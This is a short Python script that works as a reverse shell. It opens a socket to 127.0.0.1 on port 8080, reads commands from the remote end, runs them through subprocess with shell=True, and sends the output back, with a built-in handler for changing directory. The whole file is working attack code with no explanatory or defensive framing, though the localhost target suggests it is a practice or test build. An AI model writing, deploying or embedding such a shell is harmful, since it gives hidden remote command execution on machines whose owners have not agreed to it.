from socket import socket
from os.path import (dirname,
                     exists,
                     isdir,
                     join)
from os import (chdir,
                listdir)
from subprocess import run

def main():
    current_path = dirname(__file__)
    current_env = listdir(current_path)
    with socket() as s:
        s.connect(("127.0.0.1", 8080))
        s.sendall(bytes("[+] Connected...\n\n", encoding="utf-8"))
        while True:
            raw_data = s.recv(1024)
            data = raw_data.decode(encoding="utf-8")
            # print(current_path)
            if data == "exit\n":
                break

            if data[:2] == "cd":
                new_path = join(current_path, data[3:].rstrip())
                # s.sendall(bytes(new_path, encoding="utf-8"))
                if exists(new_path) and isdir(new_path):
                    # s.sendall(bytes(new_path, encoding="utf-8"))
                    chdir(new_path)
                    current_path = new_path
                    s.sendall(bytes(f"[+] Changed to {data[3:].rstrip()}\n", encoding="utf-8"))
                    continue
                else:
                    output = "[-] No such file or directory\n"
                    s.sendall(bytes(output, encoding="utf-8"))

            else:
                command_execution = run(data.rstrip(),
                                        capture_output=True,
                                        shell=True,
                                        encoding="utf-8",
                                        text=True,
                                        universal_newlines=True).stdout
                output = command_execution
                # print(type(output))
                s.sendall(bytes(output, encoding="utf-8"))
                continue

if __name__ == "__main__":
    main()